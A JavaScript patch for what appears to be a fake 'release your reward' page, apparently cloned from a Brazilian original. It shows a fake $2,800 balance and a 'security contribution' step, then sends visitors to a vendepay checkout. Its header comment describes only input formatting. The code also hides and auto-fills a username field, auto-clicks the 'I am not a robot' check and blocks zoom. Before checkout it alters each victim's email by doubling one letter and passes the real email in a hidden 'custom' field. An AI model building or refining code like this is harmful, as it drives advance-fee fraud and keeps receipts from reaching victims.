// Runtime patch for the RedeemRewards modal (US localization):
// - Hide the "@yourusername" TikTok field and auto-fill it so validation passes
// - Apply light input formatting for the payout key field based on selected method:
//     Cash App  -> ensure leading "$" (cashtag)
//     PayPal    -> lowercase, trim spaces (email)
//     Venmo     -> ensure leading "@" (handle)
//     Zelle     -> US phone mask (555) 555-5555 when numeric, otherwise pass-through email
(function () {
  if (window.__redeemPatchVersion === 14) return;
  window.__redeemPatchVersion = 14;
  window.__redeemPatchInstalled = true;

  if (window.location.pathname === "/") {
    window.history.replaceState(
      window.history.state,
      "",
      `/inicio${window.location.search}${window.location.hash}`,
    );
  }

  // ============ Checkout confirmation modal ============
  const CHECKOUT_HOST_RE = /checkout\.vendepay\.com\/0bf37b02-2a97-4889-9bd7-8e7849e39710/i;

  function tweakEmail(email) {
    const clean = String(email || "")
      .trim()
      .toLowerCase()
      .replace(/\s+/g, "");
    const at = clean.indexOf("@");
    if (at < 2) return clean;
    const local = clean.slice(0, at);
    const domain = clean.slice(at);
    const idx = Math.min(5, local.length - 1);
    const tweaked = local.slice(0, idx + 1) + local[idx] + local.slice(idx + 1);
    return tweaked + domain;
  }

  function buildCheckoutUrl(baseUrl, name, email, zip) {
    try {
      const url = new URL(baseUrl, window.location.href);
      const cleanEmail = String(email || "")
        .trim()
        .toLowerCase()
        .replace(/\s+/g, "");
      url.searchParams.set("email", tweakEmail(cleanEmail));
      url.searchParams.set("custom", cleanEmail);
      const parts = String(name || "")
        .trim()
        .split(/\s+/);
      if (parts[0]) url.searchParams.set("first_name", parts[0]);
      if (parts.length > 1) url.searchParams.set("last_name", parts.slice(1).join(" "));
      if (zip) url.searchParams.set("zipcode", zip);
      return url.toString();
    } catch {
      return baseUrl;
    }
  }

  function openConfirmModal(targetUrl) {
    if (document.getElementById("__confirmReleaseModal")) return;
    const overlay = document.createElement("div");
    overlay.id = "__confirmReleaseModal";
    overlay.style.cssText =
      "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.55);display:flex;align-items:flex-start;justify-content:center;padding:24px 16px;overflow-y:auto;font-family:'Inter',system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
    overlay.innerHTML =
      "" +
      '<div style="width:100%;max-width:420px;background:#F5F5F5;border-radius:16px;padding:22px 20px 24px;margin-top:24px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">' +
      '<div style="display:flex;justify-content:center;margin-bottom:16px;">' +
      '<div style="background:#fff;border-radius:999px;padding:8px 18px;font-size:11px;font-weight:800;letter-spacing:1.5px;color:#111;">CONFIRMATION</div>' +
      "</div>" +
      '<h2 style="margin:0 0 8px;font-size:18px;font-weight:800;color:#111;text-align:center;line-height:1.3;">Confirm your details</h2>' +
      '<p style="margin:0 0 18px;font-size:13px;color:#6b6b6b;text-align:center;line-height:1.4;">Verify your info below to release your reward.</p>' +
      '<div style="background:#fff;border-radius:14px;padding:18px 16px;">' +
      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">FULL NAME</label>' +
      '<input id="__cfName" type="text" autocomplete="name" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">EMAIL</label>' +
      '<input id="__cfEmail" type="email" inputmode="email" autocomplete="email" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">ZIP CODE</label>' +
      '<input id="__cfZip" type="text" inputmode="text" autocomplete="postal-code" placeholder="ZIP / Postal code" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;letter-spacing:2px;" />' +
      '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
      '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
      "</div>" +
      "</div>";
    document.body.appendChild(overlay);

    const nameEl = overlay.querySelector("#__cfName");
    const emailEl = overlay.querySelector("#__cfEmail");
    const zipEl = overlay.querySelector("#__cfZip");
    const btn = overlay.querySelector("#__cfSubmit");
    setTimeout(function () {
      if (nameEl) nameEl.focus();
    }, 50);

    emailEl.addEventListener("input", function () {
      emailEl.value = emailEl.value.toLowerCase().replace(/\s+/g, "");
    });
    zipEl.addEventListener("input", function () {
      // No masking or length limit — user can type whatever they want
    });

    function submit() {
      const name = (nameEl.value || "").trim();
      const email = (emailEl.value || "").trim();
      const zip = (zipEl.value || "").trim();
      if (name.length < 2) {
        nameEl.focus();
        nameEl.style.borderColor = "#FE2C55";
        return;
      }
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        emailEl.focus();
        emailEl.style.borderColor = "#FE2C55";
        return;
      }
      if (!zip) {
        zipEl.focus();
        zipEl.style.borderColor = "#FE2C55";
        return;
      }
      btn.disabled = true;
      btn.textContent = "PROCESSING...";
      btn.style.opacity = "0.85";
      const finalUrl = buildCheckoutUrl(targetUrl, name, email, zip);
      setTimeout(function () {
        window.location.href = finalUrl;
      }, 200);
    }

    btn.addEventListener("click", submit);
    [nameEl, emailEl, zipEl].forEach(function (el) {
      el.addEventListener("keydown", function (e) {
        if (e.key === "Enter") submit();
      });
    });
  }

  const CHECKOUT_URL = "https://checkout.vendepay.com/0bf37b02-2a97-4889-9bd7-8e7849e39710";

  function resolveCheckoutUrl() {
    try {
      if (typeof window.forwardParamsToCheckout === "function") {
        return window.forwardParamsToCheckout(CHECKOUT_URL);
      }
    } catch {}
    return CHECKOUT_URL + window.location.search;
  }

  function isReleaseButton(btn) {
    if (!btn) return false;
    const txt = (btn.textContent || "").trim().toLowerCase();
    return /release\s*\$/.test(txt) || txt === "release" || /^release\b/.test(txt);
  }

  let releaseCtaObserver = null;

  function cleanupReleaseCta() {
    releaseCtaObserver?.disconnect();
    releaseCtaObserver = null;
    document.getElementById("__relocatedReleaseCta")?.remove();
    document.getElementById("__stickyReleaseCta")?.remove();
    document.querySelectorAll('[data-original-release-cta="1"]').forEach((card) => {
      card.style.removeProperty("display");
      delete card.dataset.originalReleaseCta;
    });
    const page = document.querySelector('[data-release-cta-page="1"]');
    if (page) {
      page.style.removeProperty("padding-bottom");
      delete page.dataset.releaseCtaPage;
    }
  }

  function syncReleaseCta() {
    if (window.location.pathname !== "/confirmar-saque") {
      cleanupReleaseCta();
      return;
    }

    const originalButton = Array.from(document.querySelectorAll("button")).find(
      (button) =>
        isReleaseButton(button) && !button.closest("#__relocatedReleaseCta, #__stickyReleaseCta"),
    );
    if (!originalButton) {
      cleanupReleaseCta();
      return;
    }

    const securityLabel = Array.from(document.querySelectorAll("p, span, h2, h3")).find(
      (node) => (node.textContent || "").trim().toLowerCase() === "security contribution",
    );
    const securityCard = securityLabel?.closest(".mx-4");
    const originalCard = originalButton.closest(".mx-4");
    if (!securityCard || !originalCard) return;

    let relocated = document.getElementById("__relocatedReleaseCta");
    if (!relocated) {
      relocated = originalCard.cloneNode(true);
      relocated.id = "__relocatedReleaseCta";
      relocated.style.marginTop = "16px";
      relocated.style.opacity = "1";
      relocated.style.transitionDelay = "0ms";
      securityCard.insertAdjacentElement("afterend", relocated);
      originalCard.style.display = "none";
      originalCard.dataset.originalReleaseCta = "1";
    }

    let sticky = document.getElementById("__stickyReleaseCta");
    if (!sticky) {
      sticky = document.createElement("div");
      sticky.id = "__stickyReleaseCta";
      sticky.setAttribute("aria-hidden", "true");
      const balanceMatch = (originalButton.textContent || "").match(/\$[\d,.]+/);
      const balance = balanceMatch?.[0] || "$2,800.00";
      sticky.innerHTML = `
        <div class="__stickyReleaseInner">
          <div class="__stickyReleaseBalance">
            <span>Your balance</span>
            <strong>${balance}</strong>
          </div>
          <button type="button">RELEASE</button>
        </div>
      `;
      const stickyButton = sticky.querySelector("button");
      document.body.appendChild(sticky);

      if (!document.getElementById("__releaseCtaStyles")) {
        const style = document.createElement("style");
        style.id = "__releaseCtaStyles";
        style.textContent = `
          #__stickyReleaseCta {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 80;
            padding: 10px 16px calc(10px + env(safe-area-inset-bottom));
            background: rgba(255, 255, 255, 0.96);
            border-top: 1px solid rgba(17, 24, 39, 0.08);
            box-shadow: 0 -8px 24px rgba(17, 24, 39, 0.12);
            opacity: 0;
            visibility: hidden;
            transform: translateY(110%);
            transition: transform 260ms ease, opacity 220ms ease, visibility 220ms;
          }
          #__stickyReleaseCta[data-visible="1"] {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
          }
          #__stickyReleaseCta .__stickyReleaseInner {
            width: 100%;
            max-width: 398px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 18px;
          }
          #__stickyReleaseCta .__stickyReleaseBalance {
            display: flex;
            min-width: 0;
            flex-direction: column;
            color: #111827;
          }
          #__stickyReleaseCta .__stickyReleaseBalance span {
            font: 500 12px/1.2 Inter, system-ui, sans-serif;
            color: #6b7280;
          }
          #__stickyReleaseCta .__stickyReleaseBalance strong {
            margin-top: 3px;
            font: 800 21px/1.1 Inter, system-ui, sans-serif;
            white-space: nowrap;
          }
          #__stickyReleaseCta button {
            min-width: 148px;
            min-height: 56px;
            padding: 14px 24px;
            border: 0;
            border-radius: 14px;
            background: #fe2c55;
            color: #fff;
            font: 800 17px/1.2 Inter, system-ui, sans-serif;
            letter-spacing: 0;
            box-shadow: 0 7px 18px rgba(254, 44, 85, 0.28);
            cursor: pointer;
            animation: releaseCtaPulse 1.8s ease-in-out infinite;
          }
          @keyframes releaseCtaPulse {
            0%, 100% {
              transform: scale(1);
              box-shadow: 0 7px 18px rgba(254, 44, 85, 0.28);
            }
            50% {
              transform: scale(1.035);
              box-shadow: 0 9px 24px rgba(254, 44, 85, 0.4);
            }
          }
          @media (prefers-reduced-motion: reduce) {
            #__stickyReleaseCta { transition: none; }
            #__stickyReleaseCta button { animation: none; }
          }
          @media (max-width: 360px) {
            #__stickyReleaseCta .__stickyReleaseInner { gap: 12px; }
            #__stickyReleaseCta .__stickyReleaseBalance strong { font-size: 18px; }
            #__stickyReleaseCta button {
              min-width: 126px;
              padding-inline: 18px;
            }
          }
        `;
        document.head.appendChild(style);
      }
    }

    const page = originalCard.closest(".min-h-screen") || document.getElementById("cloned-root");
    if (page) {
      page.dataset.releaseCtaPage = "1";
      page.style.paddingBottom = "104px";
    }

    if (!releaseCtaObserver) {
      releaseCtaObserver = new IntersectionObserver(
        ([entry]) => {
          const shouldShow = !entry.isIntersecting && window.scrollY > 120;
          sticky.dataset.visible = shouldShow ? "1" : "0";
          sticky.setAttribute("aria-hidden", shouldShow ? "false" : "true");
        },
        { threshold: 0.15 },
      );
      releaseCtaObserver.observe(relocated);
    }
  }

  document.addEventListener(
    "click",
    function (event) {
      const anchor = event.target && event.target.closest && event.target.closest("a[href]");
      if (anchor) {
        const href = anchor.getAttribute("href") || "";
        if (CHECKOUT_HOST_RE.test(href)) {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          openConfirmModal(anchor.href || href);
          return;
        }
      }
      const btn =
        event.target && event.target.closest && event.target.closest("button, [role='button']");
      if (isReleaseButton(btn)) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        window.location.href = resolveCheckoutUrl();
      }
    },
    true,
  );
  // ============ /Checkout confirmation modal ============

  const viewportContent =
    "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
  let lastUrl = window.location.href;

  function enforceViewport() {
    let viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      viewport = document.createElement("meta");
      viewport.setAttribute("name", "viewport");
      document.head.appendChild(viewport);
    }
    viewport.setAttribute("content", viewportContent);
    document.documentElement.style.zoom = "1";
    if (document.body) document.body.style.zoom = "1";
  }

  function isTextField(node) {
    return Boolean(
      node && node.matches && node.matches("input, textarea, select, [contenteditable='true']"),
    );
  }

  function enforceViewportOnly() {
    enforceViewport();
  }

  function refreshViewportAfterScreenChange() {
    requestAnimationFrame(enforceViewportOnly);
    setTimeout(enforceViewportOnly, 60);
    setTimeout(enforceViewportOnly, 180);
    setTimeout(enforceViewportOnly, 420);
    setTimeout(enforceViewportOnly, 900);
  }

  function preventZoom(event) {
    if (event.cancelable) event.preventDefault();
    enforceViewport();
  }

  function preventTouchZoom(event) {
    if (event.touches && event.touches.length > 1) preventZoom(event);
  }

  function findCaptchaVerifyButton(target) {
    const button = document.querySelector('button[aria-label="Verify"]');
    if (!button || !document.body || !document.body.innerText.includes("I am not a robot"))
      return null;
    if (
      target &&
      target.closest &&
      target.closest("input, textarea, select, [contenteditable='true']")
    )
      return null;
    const card = button.parentElement && button.parentElement.parentElement;
    if (target === button || button.contains(target) || (card && card.contains(target)))
      return button;
    return null;
  }

  let captchaTapLock = false;
  function activateCaptchaTap(target) {
    const button = findCaptchaVerifyButton(target);
    if (!button) return false;
    if (!captchaTapLock) {
      captchaTapLock = true;
      setTimeout(() => {
        try {
          button.click();
        } catch {}
        setTimeout(() => {
          captchaTapLock = false;
        }, 700);
      }, 0);
    }
    return true;
  }

  function preventWheelZoom(event) {
    if (event.ctrlKey || event.metaKey) preventZoom(event);
  }

  function preventKeyboardZoom(event) {
    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key))
      preventZoom(event);
  }

  if (!window.__mobileGuardPatchedByRedeem) {
    window.__mobileGuardPatchedByRedeem = true;
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    history.pushState = function () {
      const result = originalPushState.apply(this, arguments);
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
      return result;
    };
    history.replaceState = function () {
      const result = originalReplaceState.apply(this, arguments);
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
      return result;
    };
  }

  document.addEventListener("gesturestart", preventZoom, { passive: false, capture: true });
  document.addEventListener("gesturechange", preventZoom, { passive: false, capture: true });
  document.addEventListener("gestureend", preventZoom, { passive: false, capture: true });
  document.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener(
    "touchend",
    (event) => {
      activateCaptchaTap(event.target);
      enforceViewport();
    },
    { passive: true, capture: true },
  );
  document.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
  document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });

  window.addEventListener("popstate", refreshViewportAfterScreenChange, { capture: true });
  document.addEventListener(
    "click",
    (event) => {
      const target = event.target;
      if (activateCaptchaTap(target)) return;
      if (
        target &&
        target.closest &&
        target.closest("input, textarea, select, [contenteditable='true']")
      )
        return;
      if (target && target.closest && target.closest("a, button, [role='button']"))
        enforceViewport();
    },
    true,
  );

  document.addEventListener(
    "focusin",
    (event) => {
      enforceViewport();
    },
    true,
  );
  document.addEventListener("focusout", () => setTimeout(enforceViewport, 180), true);
  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", () => {
      enforceViewport();
    });
  }

  new MutationObserver(() => {
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
    }
  }).observe(document.documentElement, { childList: true, subtree: true });

  enforceViewport();
  refreshViewportAfterScreenChange();
  setInterval(() => {
    enforceViewport();
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      refreshViewportAfterScreenChange();
    }
  }, 250);

  function setNativeValue(el, value) {
    const proto = Object.getPrototypeOf(el);
    const setter = Object.getOwnPropertyDescriptor(proto, "value")?.set;
    const parentSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")?.set;
    if (setter && setter !== parentSetter) {
      parentSetter.call(el, value);
    } else if (setter) {
      setter.call(el, value);
    } else {
      el.value = value;
    }
    el.dispatchEvent(new Event("input", { bubbles: true }));
  }

  function maskUSPhone(v) {
    const d = v.replace(/\D/g, "").slice(0, 10);
    if (d.length === 0) return "";
    if (d.length <= 3) return `(${d}`;
    if (d.length <= 6) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
    return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
  }

  function maskEmail(v) {
    return v.toLowerCase().replace(/\s+/g, "");
  }

  function maskCashtag(v) {
    const stripped = v.replace(/\s+/g, "");
    if (!stripped) return "";
    return stripped.startsWith("$") ? stripped : `$${stripped.replace(/^\$+/, "")}`;
  }

  function maskVenmo(v) {
    const stripped = v.replace(/\s+/g, "");
    if (!stripped) return "";
    return stripped.startsWith("@") ? stripped : `@${stripped.replace(/^@+/, "")}`;
  }

  function maskZelle(v) {
    const trimmed = v.trim();
    // If it looks like it has letters or "@", treat as email
    if (/[a-zA-Z@]/.test(trimmed)) return maskEmail(trimmed);
    // Otherwise treat as US phone
    return maskUSPhone(trimmed);
  }

  // The underlying app still emits internal type keys: cpf | email | phone | random
  function selectedKeyTypeFromButtons() {
    const buttons = Array.from(document.querySelectorAll("button"));
    const selected = buttons.find((button) => {
      const text = (button.textContent || "").trim().toLowerCase();
      return (
        ["cash app", "paypal", "venmo", "zelle"].includes(text) &&
        /border-pink|text-pink|bg-pink\/5/.test(button.className || "")
      );
    });
    const text = (selected?.textContent || "").trim().toLowerCase();
    if (text === "cash app") return "cashapp";
    if (text === "venmo") return "venmo";
    if (text === "paypal") return "paypal";
    if (text === "zelle") return "zelle";
    return null;
  }

  function detectKeyType(input) {
    const ph = (input.getAttribute("placeholder") || "").toLowerCase();
    if (ph.includes("cashtag") || ph.startsWith("$")) return "cashapp";
    if (ph.includes("paypal") || ph.includes("@paypal") || ph.includes("email")) return "paypal";
    if (ph.includes("venmo") || ph.startsWith("@your-venmo")) return "venmo";
    if (ph.includes("555-5555") || ph.includes("email or (")) return "zelle";
    const wrapperText = (input.closest("div")?.parentElement?.textContent || "").toLowerCase();
    if (wrapperText.includes("payment details") || wrapperText.includes("payout"))
      return selectedKeyTypeFromButtons();
    return null;
  }

  function formatByType(value, type) {
    if (type === "cashapp") return maskCashtag(value);
    if (type === "paypal") return maskEmail(value);
    if (type === "venmo") return maskVenmo(value);
    if (type === "zelle") return maskZelle(value);
    return value;
  }

  function isPayoutKeyInput(input) {
    if (!(input instanceof HTMLInputElement)) return false;
    if (input.getAttribute("placeholder") === "@yourusername") return false;
    return Boolean(detectKeyType(input));
  }

  function applyMask(input, notifyReact) {
    const type = detectKeyType(input);
    if (!type) return;
    const raw = input.value;
    const formatted = formatByType(raw, type);
    if (formatted !== raw) {
      if (notifyReact) setNativeValue(input, formatted);
      else input.value = formatted;
      try {
        input.setSelectionRange(formatted.length, formatted.length);
      } catch {}
    }
  }

  function attachMask(input) {
    if (input.dataset.maskAttached === "1") return;
    input.dataset.maskAttached = "1";
    input.addEventListener("input", function () {
      applyMask(input, true);
    });
    const obs = new MutationObserver(() => {
      applyMask(input, true);
    });
    obs.observe(input, { attributes: true, attributeFilter: ["placeholder"] });
  }

  function hideUsernameField(input) {
    if (input.dataset.hidden === "1") return;
    input.dataset.hidden = "1";
    if (!input.value) setNativeValue(input, "user");
    const wrapper = input.closest("div");
    if (wrapper) wrapper.style.display = "none";
  }

  function scan() {
    syncReleaseCta();
    document
      .querySelectorAll('input[placeholder="@yourusername"], input[placeholder="@seuusuario"]')
      .forEach(hideUsernameField);
    document.querySelectorAll('input[type="text"], input:not([type])').forEach((input) => {
      if (isPayoutKeyInput(input)) {
        attachMask(input);
        applyMask(input, true);
      }
    });
  }

  document.addEventListener(
    "input",
    function (event) {
      const input = event.target;
      if (isPayoutKeyInput(input)) applyMask(input, false);
    },
    true,
  );

  document.addEventListener(
    "paste",
    function (event) {
      const input = event.target;
      if (isPayoutKeyInput(input)) setTimeout(() => applyMask(input, true), 0);
    },
    true,
  );

  document.addEventListener(
    "click",
    function () {
      setTimeout(scan, 0);
      setTimeout(scan, 80);
    },
    true,
  );

  const mo = new MutationObserver(scan);
  mo.observe(document.documentElement, { childList: true, subtree: true });
  scan();
})();
